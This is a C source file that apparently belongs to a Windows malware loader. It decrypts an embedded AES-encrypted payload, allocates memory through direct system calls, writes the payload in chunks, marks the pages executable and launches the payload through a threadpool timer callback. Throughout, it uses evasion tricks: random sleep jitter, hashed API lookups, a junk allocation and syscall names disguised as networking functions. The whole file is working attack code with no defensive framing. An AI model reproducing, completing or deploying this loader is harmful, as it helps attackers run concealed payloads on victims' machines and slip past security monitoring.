#include <windows.h>
#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "CtAes.h"
#include "Debug.h"

extern NETWORK_CONFIG g_NetworkConfig;

#define BASE_PAGE_SIZE 4096
#define PAGE_SIZE_MIN  4096
#define PAGE_SIZE_MAX  8192
#define RANDOM_PAGE_SIZE() (PAGE_SIZE_MIN + (GetTickCount() % (PAGE_SIZE_MAX - PAGE_SIZE_MIN)))
#define SET_TO_MULTIPLE_OF_4096(X) ( ((X) + 4095) & (~4095) )

BOOL XmExtractCryptoConfig(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* sPayloadSize, OUT PBYTE* ppDecryptedPayload) {
    BOOL bResult = FALSE;
    AES256_CBC_ctx CtAesCtx = { 0 };
    BYTE pAesKey[CRYPTO_KEY_SIZE] = { 0 };
    BYTE pAesIv[CRYPTO_IV_SIZE] = { 0 };
    PBYTE uAesKeyPtr = NULL;
    PBYTE uAesIvPtr = NULL;

    uAesKeyPtr = pPayloadBuffer + *sPayloadSize - (CRYPTO_KEY_SIZE + CRYPTO_IV_SIZE);
    uAesIvPtr = pPayloadBuffer + *sPayloadSize - CRYPTO_IV_SIZE;

    memcpy(pAesKey, uAesKeyPtr, CRYPTO_KEY_SIZE);
    memcpy(pAesIv, uAesIvPtr, CRYPTO_IV_SIZE);

    *sPayloadSize = *sPayloadSize - (CRYPTO_KEY_SIZE + CRYPTO_IV_SIZE);
    
    // Add jitter
    Sleep(1 + (GetTickCount() % 5));
    
    AES256_CBC_init(&CtAesCtx, pAesKey, pAesIv);
    if (!AES256_CBC_decrypt(&CtAesCtx, pPayloadBuffer, *sPayloadSize, ppDecryptedPayload))
        goto _FUNC_CLEANUP;

    bResult = TRUE;

_FUNC_CLEANUP:
    HeapFree(GetProcessHeap(), 0x00, pPayloadBuffer);
    return bResult;
}

BOOL XmAllocateEncryptedSection(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload) {
    // Add timing jitter
    Sleep(50 + (GetTickCount() % 100));
    
    PBYTE pDecryptedPayload = NULL;
    if (!XmExtractCryptoConfig(pPayloadBuffer, &sPayloadSize, &pDecryptedPayload))
        return FALSE;

    NTSTATUS STATUS = 0x00;
    SIZE_T sNewPayloadSize = SET_TO_MULTIPLE_OF_4096(sPayloadSize);
    SIZE_T sChunkSize = BASE_PAGE_SIZE;
    DWORD ii = (DWORD)(sNewPayloadSize / BASE_PAGE_SIZE);
    DWORD dwOldPermissions = 0x00;
    PVOID pAddress = NULL;
    PVOID pTmpAddress = NULL;
    PBYTE pTmpPayload = NULL;

    if (!g_NetworkConfig.bInitialized)
        return FALSE;

    // Add junk allocation
    PVOID pJunkAddr = NULL;
    SIZE_T sJunkSize = RANDOM_PAGE_SIZE();
    SET_SYSCALL(g_NetworkConfig.BufferAllocate);
    XmInvokeSystemCall(NtCurrentProcess(), &pJunkAddr, 0, &sJunkSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    sNewPayloadSize = sNewPayloadSize + BASE_PAGE_SIZE;
    
    // Main allocation
    SET_SYSCALL(g_NetworkConfig.BufferAllocate);
    if (!NT_SUCCESS(STATUS = XmInvokeSystemCall(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY))) {
        return FALSE;
    }

    sNewPayloadSize = sNewPayloadSize - BASE_PAGE_SIZE;
    pAddress = (PVOID)((ULONG_PTR)pAddress + BASE_PAGE_SIZE);

    // Commit memory in chunks with jitter
    pTmpAddress = pAddress;
    for (DWORD i = 0; i < ii; i++) {
        Sleep(1 + (GetTickCount() % 5));  // Add jitter
        
        SET_SYSCALL(g_NetworkConfig.BufferAllocate);
        if (!NT_SUCCESS(STATUS = XmInvokeSystemCall(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE))) {
            return FALSE;
        }
        pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
    }

    // Write payload with jitter
    pTmpAddress = pAddress;
    pTmpPayload = pDecryptedPayload;
    for (DWORD i = 0; i < ii; i++) {
        Sleep(1 + (GetTickCount() % 3));  // Add jitter
        XmCopyNetworkBuffer(pTmpAddress, pTmpPayload, BASE_PAGE_SIZE);
        pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + BASE_PAGE_SIZE);
        pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + BASE_PAGE_SIZE);
    }

    // Change protection with two-step approach
    pTmpAddress = pAddress;
    for (DWORD i = 0; i < ii; i++) {
        Sleep(1 + (GetTickCount() % 3));  // Add jitter
        
        SET_SYSCALL(g_NetworkConfig.TlsHandshake);
        // First RW
        if (!NT_SUCCESS(STATUS = XmInvokeSystemCall(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_READWRITE, &dwOldPermissions)))
            return FALSE;
            
        Sleep(1 + (GetTickCount() % 5));
        
        // Then RX
        if (!NT_SUCCESS(STATUS = XmInvokeSystemCall(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READ, &dwOldPermissions)))
            return FALSE;

        pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
    }

    *pInjectedPayload = pAddress;
    return TRUE;
}

VOID XmScheduleAsyncOperation(IN PVOID pInjectedPayload) {
    if (!pInjectedPayload)
        return;
        
    // Add random initial delay
    Sleep(1000 + (GetTickCount() % 2000));

    TP_CALLBACK_ENVIRON tpCallbackEnv = { 0 };
    FILETIME FileDueTime = { 0 };
    ULARGE_INTEGER ulDueTime = { 0 };
    PTP_TIMER ptpTimer = NULL;

    fnCreateThreadpoolTimer pCreateThreadpoolTimer = (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH), ASYNC_TIMER_CREATE_HASH);
    fnSetThreadpoolTimer pSetThreadpoolTimer = (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH), ASYNC_TIMER_SET_HASH);
    fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(SYSTEM_PROTOCOL_DLL_HASH), SYNC_WAIT_HASH);

    if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject)
        return;

    InitializeThreadpoolEnvironment(&tpCallbackEnv);

    if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv)))
        return;

    // Add random jitter to timer
    DWORD dwJitter = GetTickCount() % 1000;
    ulDueTime.QuadPart = (ULONGLONG)-((NETWORK_TIMEOUT + dwJitter) * 10 * 1000 * 1000);
    FileDueTime.dwHighDateTime = ulDueTime.HighPart;
    FileDueTime.dwLowDateTime = ulDueTime.LowPart;

    // Set timer to fire only once by using 0 for period
    pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0, 0);

    // Wait for completion
    Sleep(500 + (GetTickCount() % 1000));
    pWaitForSingleObject((HANDLE)-1, INFINITE);
}
